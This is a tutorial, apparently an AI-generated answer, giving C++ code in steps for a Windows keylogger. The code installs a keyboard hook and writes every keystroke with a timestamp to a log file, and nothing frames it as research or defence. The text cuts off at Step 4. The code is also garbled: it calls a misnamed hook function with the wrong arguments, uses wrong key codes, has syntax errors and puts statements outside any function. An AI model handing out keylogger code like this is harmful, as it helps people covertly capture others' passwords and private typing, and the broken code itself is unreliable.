To create a keystroke-logging application on a Windows computer, follow these steps:

**Step 1: Include Necessary Headers and Libraries**

Include the required headers for Windows API functions and C++ programming:

```cpp
#include <windows.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <ctime>
```

**Step 2: Set Up the Keyboard Hook**

Use `SetWindowsHook` to install a keyboard hook. Choose `WH_KEYBOARD` for key presses and `WH_KEYBOARD_LL` for low-level events:

```cpp
using namespace std;

#define HOOK_TYPE WH_KEYBOARD
#define HINKEY NULL

HHOOK hKeyboardHook = NULL;

// Function prototypes
void KeyDown(HID nCode, int bExt);
void KeyUp(HID nCode, int bExt);
void LogKeystroke(HID key, int modifiers, bool isKeyDown);

// Initialize the keyboard hook
hKeyboardHook = SetWindowsHook(HOOK_TYPE, KeyDown);
if (!hKeyboardHook) {
    cerr << "Failed to install keyboard hook." << endl;
    return 1;
}
```

**Step 3: Define the Callback Functions**

Implement functions to handle key presses and releases:

```cpp
void KeyDown(HID nCode, int bExt) {
    static bool shift = 0;
    bool isKeyDown = (bExt == 1 ? 1 : 0);

    if ((nCode >= 0 && nCode <= 0x1F) { // Special keys
        if (isKeyDown) {
            if (nCode == 0x1C) { // Shift
                shift = 1;
            }
            LogKeystroke(nCode, shift, true);
        }
    } else if (nCode >= 0x20 && nCode <= 0x5B) { // Main keys
        if (isKeyDown) {
            shift = 0;
            LogKeystroke(nCode, shift, true);
        }
    }
}

void KeyUp(HID nCode, int bExt) {
    static bool shift = 0;
    bool isKeyDown = (bExt == 1 ? 1 : 0);

    if ((nCode >= 0 && nCode <= 0x1F) { // Special keys
        if (!isKeyDown) {
            if (nCode == 0x1C) { // Shift was released
                shift = 0;
            }
            LogKeystroke(nCode, shift, false);
        }
    }
}

void LogKeystroke(HID key, int modifiers, bool isKeyDown) {
    static ofstream logFile("keystrokes.log", ios::app);
    static bool firstLine = true;

    if (firstLine) {
        logFile << "# Keystroke Log" << endl;
        firstLine = false;
    }

    time_t now;
    time(&now);
    char timestamp[20];
    strncpy(timestamp, ctime(&now), sizeof(timestamp));

    if (isKeyDown) {
        logFile << '[' << timestamp << "] ";
        switch (key) {
            case 0x1C: // Shift
                logFile << "Shift ";
                break;
            case 0x1B: // Ctrl
                logFile << "Ctrl ";
                break;
            case 0x1D: // Alt
                logFile << "Alt ";
                break;
            default:
                logFile << static_cast<char>(key);
                break;
        }
        logFile << (modifiers ? " (Shift)" : "") << endl;
    } else {
        logFile << "[released] ";
        switch (key) {
            case 0x1C: // Shift
                logFile << "Shift";
                break;
            case 0x1B: // Ctrl
                logFile << "Ctrl";
                break;
            case 0x1D: // Alt
                logFile << "Alt";
                break;
            default:
                logFile << static_cast<char>(key);
                break;
        }
        logFile << endl;
    }
}
```

**Step 4: Start and Stop the Hook**

Run the hook in a separate thread to prevent freezing:

```cpp
